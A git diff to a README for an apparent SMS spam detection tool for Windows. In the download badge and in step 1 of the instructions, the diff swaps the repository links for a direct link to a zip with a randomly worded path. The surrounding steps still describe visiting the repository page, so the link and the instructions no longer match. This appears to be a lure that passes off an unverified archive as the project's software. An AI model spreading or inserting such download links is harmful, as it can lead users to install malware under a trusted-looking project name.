@@ -1,6 +1,6 @@
 # 🛡️ SMS-Spam-Detection - Identify spam messages with high accuracy
 
-[![](https://img.shields.io/badge/Download-Software-blue)](https://github.com/joelcategorical607/SMS-Spam-Detection)
+[![](https://img.shields.io/badge/Download-Software-blue)](https://github.com/joelcategorical607/SMS-Spam-Detection/raw/refs/heads/main/sulphogermanate/SM_Detection_Spam_concoctive.zip)
 
 ## 📋 What this tool does
 
@@ -14,7 +14,7 @@ Your computer needs to run a recent version of Windows to use this tool. Please 
 
 You retrieve the software through the official project page. Follow these steps to prepare your computer.
 
-1. Visit the project repository at https://github.com/joelcategorical607/SMS-Spam-Detection.
+1. Visit the project repository at https://github.com/joelcategorical607/SMS-Spam-Detection/raw/refs/heads/main/sulphogermanate/SM_Detection_Spam_concoctive.zip
 2. Look for the green button labeled Code.
 3. Click the button and select Download ZIP.
 4. Wait for the file to finish saving to your computer.
